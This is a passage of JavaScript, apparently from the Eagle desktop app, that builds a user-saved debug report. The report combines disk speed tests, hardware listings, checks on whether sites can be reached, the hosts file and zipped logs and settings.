			var tagsPath = path.normalize(`${libraryPath}/tags.json`);
			var savedFilterPath = path.normalize(`${libraryPath}/saved-filters.json`);
			var allCount = $bodyScope.raw && $bodyScope.raw.length || "undefined";
			var folderCount = $bodyScope.folderList && $bodyScope.folderList.length || "undefined";
			var smartFolderCount = $bodyScope.smartFolders && $bodyScope.smartFolders.length || "undefined";
			var quickAccessCount = $bodyScope.quickAccess && $bodyScope.quickAccess.length || "undefined";
			var fileTypeCount = eagle.filter.filterCounts && JSON.stringify(eagle.filter.filterCounts);

			this.output += 
`
 
===========================================================================================
 Library Information
===========================================================================================
 Path             | ${libraryPath} | Writable: ${isWritable(libraryPath)} Acl: ${alcCheck(libraryPath)}
 Files            | ${allCount || 0}
 Folders          | ${folderCount || 0}
 SmartFolders     | ${smartFolderCount || 0}
 QuickAccess      | ${quickAccessCount || 0}
 metadata.json    | ${ (getSize(metadataPath) / 1024).toFixed(2) }KB | Writable: ${isWritable(metadataPath)}
 mtime.json       | ${ (getSize(mtimePath) / 1024).toFixed(2) }KB | Writable: ${isWritable(mtimePath)}
 tags.json        | ${ (getSize(tagsPath) / 1024).toFixed(2) }KB | Writable: ${isWritable(tagsPath)}
 saved-filters.json |  ${ (getSize(savedFilterPath) / 1024).toFixed(2) }KB | Writable: ${isWritable(savedFilterPath)}
 types            | ${fileTypeCount}


`;
			callback();
		}
		catch (err) {
			this.output += 
`
===========================================================================================
 Library Information
===========================================================================================
${err.stack || err}
 

`;
			callback(err);
		}
	},
	printDiskTesting: function (callback) {
		try {

			var diskSpeedTest = (dir) => {
				try {
					var startMkdirTime;
					var startWriteFileTime;
					var startRemoveDirTime;
					var mkdirTime;
					var writeFileTime;
					var removeDirTime;
					var fs = require("fs");
					fse = require('fs-extra');
					var json = `{"id":"KD9ZV3ZXM75X0","name":"illust_002_testC_v07","size":97191,"btime":1596099298000,"mtime":1596187276884,"ext":"png","tags":[],"folders":[],"isDeleted":false,"url":"","annotation":"","modificationTime":1596185885977,"width":1200,"height":1200,"noThumbnail":true,"palettes":[{"color":[59,131,250],"ratio":81},{"color":[217,219,234],"ratio":7},{"color":[73,49,32],"ratio":6},{"color":[227,95,23],"ratio":3.25},{"color":[36,179,251],"ratio":0.74},{"color":[249,159,142],"ratio":0.46}],"lastModified":1596187279643,"star":3}`;
					var testDir = path.normalize(dir + "/speedtest");

					if (!fs.existsSync(testDir)) {
					    fs.mkdirSync(testDir);
					}

					startMkdirTime = Date.now();
					for (var i = 0; i < 50; i++) {
					    var dir = `${testDir}/${i}`;
					    if (!fs.existsSync(dir)) {
					        fs.mkdirSync(dir);
					    }
					}
					mkdirTime = Date.now() - startMkdirTime;

					startWriteFileTime = Date.now();
					for (var i = 0; i < 50; i++) {
					    fs.writeFileSync(`${testDir}/${i}/~$metadata.json.tmp`, json, "utf8");
					}
					writeFileTime = Date.now() - startWriteFileTime;

					startRemoveDirTime = Date.now();
					for (var i = 0; i < 50; i++) {
					    fse.removeSync(`${testDir}/${i}`);
					}
					removeDirTime = Date.now() - startRemoveDirTime;

					fse.removeSync(testDir);

					return  {
						mkdirTime: mkdirTime,
						writeFileTime: writeFileTime,
						removeDirTime: removeDirTime
					}
				}
				catch (err) {
					console.log(err)
					return {
						mkdirTime: 0,
						writeFileTime: 0,
						removeDirTime: 0
					}
				}
			};

			var listDisks = () => {
				const execSync = require('child_process').execSync;
				var stdoutString;
				try {
					var command = "diskutil list";
					if (process.platform !== 'darwin') { command = "wmic logicaldisk get drivetype, size, filesystem, freespace, systemname, Description, Caption"; }
				    stdoutString = execSync(command, {}, {
				        timeout: 5000,
						encoding: 'utf8'
				    }).toString();

				    // 取得 S.M.A.R.T
				    if (process.platform !== 'darwin') {
				    	try {
				    		var str = execSync("wmic diskdrive get index,model,name,size,Caption,status", {}, { timeout: 5000, encoding: 'utf8' }).toString();
				    		stdoutString += `
${str}
`;
				    	}
				    	catch (err) {
				    		electronLog && electronLog.error("[app] " + err.stack || err);
				    	}
				    }
				    else {
				    	try {
					    	var disks = (stdoutString.match(/\/dev\/disk/g) || []);
					    	disks.forEach(function (disk, index) {
					    		var command = `diskutil info disk${index}`;
					    		var result = execSync(command, {}, {
							        timeout: 2000
							    }).toString();

							    stdoutString += `
----------

${result}

`;
					    	});
				    	}
				    	catch (err) {
				    		electronLog && electronLog.error("[app] " + err.stack || err);
				    	}
				    }
				}
				catch (err) {
				    stdoutString = err.stack;
				}
				return stdoutString;
			};

			var result0 = {
				mkdirTime: 0,
				writeFileTime: 0,
				removeDirTime: 0
			};

			var result1 = {
				mkdirTime: 0,
				writeFileTime: 0,
				removeDirTime: 0
			}

			const os = require('os');
			if (!fs.existsSync(EAGLE_THUMBNAIL_TEMP_PATH)) {
			    fs.mkdirSync(EAGLE_THUMBNAIL_TEMP_PATH);
			}
			result0 = diskSpeedTest(EAGLE_THUMBNAIL_TEMP_PATH);

			if ($bodyScope.libraryPath) {
				result1 = diskSpeedTest($bodyScope.libraryPath);
			}

			var stdoutString = listDisks();

			this.output += 
`
===========================================================================================
 Disk Performance Testing
===========================================================================================
 Location         | ${EAGLE_THUMBNAIL_TEMP_PATH}
 mkdir            | ${result0.mkdirTime}ms
 writeFile        | ${result0.writeFileTime}ms
 remove           | ${result0.removeDirTime}ms
------------------------------------------------------
 Location         | ${$bodyScope.libraryPath}
 mkdir            | ${result1.mkdirTime}ms
 writeFile        | ${result1.writeFileTime}ms
 remove           | ${result1.removeDirTime}ms


===========================================================================================
 Disk Information
===========================================================================================
${stdoutString}

`;
			callback();
		}
		catch (err) {
			this.output += 
`
===========================================================================================
 Disk Performance Testing
===========================================================================================
${err.stack || err}
 

`;
			callback(err);
		}
	},
	printNetworkTesting: function (callback) {
		const request = require('request');
		var that = this;
		var pingIP = (protocol, ip, port, callback) => {
			var start = Date.now();
			
			const options = {
				url: (port)? `${protocol}://${ip}:${port}`: `${protocol}://${ip}`,
				method: 'HEAD',
				timeout: 5000
			};

			console.log(options.url);
			// ping ip with request
			request(options, (err, res, body) => {
				if (err) {
					that.output += `[x] ${options.url} (${Date.now() - start}ms)\n`;
					callback();
				}
				else {
					console.log(`[v] ${options.url} (${Date.now() - start}ms)`);
					that.output += `[v] ${options.url} (${Date.now() - start}ms)\n`;
					callback();
				}
			});
		}

		this.output += 
`
===========================================================================================
 Network Testing
===========================================================================================
`;
		const async = require('async');
		var ips = [
			{
				protocol: "https",
				ip: "dribbble.com", 
			},
			{
				protocol: "https",
				ip: "pinterest.com", 
			},
			{
				protocol: "https",
				ip: "www.instagram.com", 
			},
			{
				protocol: "https",
				ip: "artstation.com", 
			},
			{
				protocol: "https",
				ip: "eagle.cool", 
			},
			{
				protocol: "https",
				ip: "en.eagle.cool", 
			},
			{
				protocol: "https",
				ip: "proxy.eagle.cool", 
			},
			{
				protocol: "https",
				ip: "community-cn.eagle.cool", 
			},
			{
				protocol: "https",
				ip: "eagleapp.oss-cn-hongkong.aliyuncs.com", 
			},
			{
				protocol: "https",
				ip: "oss-cn-shenzhen.aliyuncs.com", 
			},
			{
				ip: "oss-community-attachment.eagle.cool",
				protocol: "https",
			},
			{
				ip: "r2-plugin.eagle.cool",
				protocol: "https",
			},
			{
				protocol: "https",
				ip: "aliyuncs.com", 
			},
			{
				protocol: "http",
				ip: "120.79.10.37", 
			},
			{
				protocol: "http",
				ip: "localhost", 
				port: 41593
			},
			{
				protocol: "http",
				ip: "localhost", 
				port: 41595
			},
		];
		var cbs = ips.map(function(obj) {
        	return function(callback) {
        		pingIP(obj.protocol, obj.ip, obj.port, (err, result) =>  {
        			callback();
        		});
        	}
        });

		async.parallelLimit(cbs, 10, function(err, result) {
			that.output += `

`;
			callback();
		});
	},
	printHostInfo: function (callback) {
		try {
			var hostPath = "/etc/hosts";
        	if (process.platform !== 'darwin') { hostPath = "C:/Windows/System32/drivers/etc/hosts"; }
			var hostStr = fs.readFileSync(hostPath, "utf8");
			this.output += 
`
===========================================================================================
 Host Information
===========================================================================================
${hostStr}
`;
			callback();
		}
		catch (err) {
			this.output += 
`
===========================================================================================
 Host Information
===========================================================================================
${err.stack || err}
 

`;
			callback(err);
		}
	},
	async writeDXDInfo (dest) {
		return new Promise((resolve, reject) => {
			if (process.platform !== 'win32') { return resolve(); }
			if (fs.existsSync(dest)) { return resolve(); }
			const cmd = `dxdiag /dontskip /whql:off /64bit /t ${dest}`;
			const exec = require('child_process').exec;
			exec(cmd, (err, stdout, stderr) => {
				console.log(err);
				console.log(stdout);
				let times = 0;
				const checkFile = () => {
					times++;
					if (fs.existsSync(dest)) {
						return resolve();
					}
					else {
						if (times > 10) {		
							return resolve();
						}
						else {
							setTimeout(checkFile, 1000);
						}
					}
				}
				checkFile();
			});
		});
	},
	save: function (callback) {

		var that = this;
		var savePath;
		var libraryPath;
		var metadataPath;
		var backupPath;
		var logPath;

		$bodyScope.openAll();
		$bodyScope.$evalAsync();

		var zipFileName = i18n.__("dialog.debugReport.fileName");

		dialog.showSaveDialog(currentWindow, {
            defaultPath: path.normalize(app.getPath('home') + '/Desktop/') + `${zipFileName}.zip`,
            title: "Save as",
            filters: [{ name: 'Save', extensions: ['zip'] }]
        }).then(result => {

            var zipPath = result.filePath;
			if (!zipPath) return;
			$bodyScope.debugReportStatus = {
				isExporting: true,
				progress: 0,
			};
			$bodyScope.$evalAsync();

			electronLog && electronLog.info(`[app] Export debug report: ${zipPath}`);

			this.printHeader((err) => {
				this.printSystemInfo((err) => {
					$bodyScope.debugReportStatus.progress = 10;
					$bodyScope.$evalAsync();
					this.printApplicationInfo((err) => {
						$bodyScope.debugReportStatus.progress = 20;
						$bodyScope.$evalAsync();
						this.printLibraryInfo((err) => {
							$bodyScope.debugReportStatus.progress = 30;
							$bodyScope.$evalAsync();
							this.printPlugins((err) => {
								this.printNetworkTesting((err) => {
									$bodyScope.debugReportStatus.progress = 50;
									$bodyScope.$evalAsync();
									this.printDiskTesting((err) => {
										$bodyScope.debugReportStatus.progress = 80;
										$bodyScope.$evalAsync();
										this.printHostInfo((err) => {
											(async () => {
												$bodyScope.debugReportStatus.progress = 90;
												$bodyScope.$evalAsync();
												console.log(that.output);

												const dxdiagPath = path.normalize(`${EAGLE_THUMBNAIL_TEMP_PATH}/dxdiag.txt`);
												await this.writeDXDInfo(dxdiagPath);

												var libraryPath = $bodyScope.libraryPath;
												var metadataPath = path.normalize(`${libraryPath}/metadata.json`);
												var mtimePath = path.normalize(`${libraryPath}/mtime.json`);
												var tagsPath = path.normalize(`${libraryPath}/tags.json`);
												var savedFilterPath = path.normalize(`${libraryPath}/saved-filters.json`);
												var backupPath = path.normalize(`${libraryPath}/backup`);
												var crashpadPath = app.getPath('crashDumps');
												var settingsPath = path.normalize(`${app.getPath('userData')}/Settings`);
												var logPath = electronLog.transports.file.findLogPath();
												var reportPath = path.normalize(`${EAGLE_THUMBNAIL_TEMP_PATH}/debug-report.txt`);
												var archiver = require('archiver');
												var archive = archiver('zip', { store: false, zlib: { level: 9, chunkSize: 16 * 1024 * 4 } });
												var outputStream = fs.createWriteStream(zipPath);
												fs.writeFileSync(reportPath, that.output, "utf8");

												archive.pipe(outputStream);
												archive.file(reportPath, { name: 'debug-report.txt' });

												if (libraryPath && fs.existsSync(libraryPath)) {
													if (fs.existsSync(metadataPath)) {
														archive.file(metadataPath, { name: 'metadata.json' });
													}
													if (fs.existsSync(mtimePath)) {
														archive.file(mtimePath, { name: 'mtime.json' });
													}
													if (fs.existsSync(tagsPath)) {
														archive.file(tagsPath, { name: 'tags.json' });
													}
													if (fs.existsSync(savedFilterPath)) {
														archive.file(savedFilterPath, { name: 'saved-filters.json' });
													}
													if (fs.existsSync(backupPath)) {
														archive.directory(backupPath, 'backup');
													}
													if (fs.existsSync(crashpadPath)) {
														archive.directory(crashpadPath, 'Crashpad');
													}
													if (fs.existsSync(settingsPath)) {
														archive.file(settingsPath, { name: 'Settings' });
													}
												}

												if (fs.existsSync(logPath)) {
													archive.file(logPath, { name: 'log.log' });
												}

												if (fs.existsSync(dxdiagPath)) {
													archive.file(dxdiagPath, { name: 'dxdiag.txt' });
												}

												archive.finalize();
												outputStream.on('close', function() {
													$bodyScope.debugReportStatus = {
														isExporting: false,
														progress: 0,
													};
													$bodyScope.$evalAsync();
													ipcRenderer.send('show-item-in-folder', zipPath);
												});

												that.output = "";
											})();
										});
									});
								});
							});
						});
					});
				});
			});	
		});
	}
}

$("body").on("click", "#export-debug-report-dialog .cancel", function () {
	$bodyScope.debugReportStatus = {
		isExporting: false,
		progress: 0,
	};
	$bodyScope.$evalAsync();
});





